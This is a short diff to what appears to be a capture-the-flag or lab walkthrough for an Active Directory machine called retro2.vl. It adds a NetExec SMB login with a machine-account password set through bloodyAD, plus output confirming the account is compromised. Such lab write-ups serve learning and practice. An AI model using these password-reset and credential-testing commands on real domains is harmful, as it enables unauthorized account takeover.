@@ -236,5 +236,12 @@ bloodyAD -d retro2.vl -u 'FS01$' -k --host bln01.retro2.vl set password 'ADMWS01
 This changed the password
 
 ```python
-
+nxc smb bln01.retro2.vl -u 'ADMWS01$' -p 'dmuhackers123!'         
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.12.5     445    BLN01            [+] retro2.vl\ADMWS01$:dmuhackers123!
 ```
+This machine account has now been compromised
+
+This machine account has no extra privs on SMB
+
+
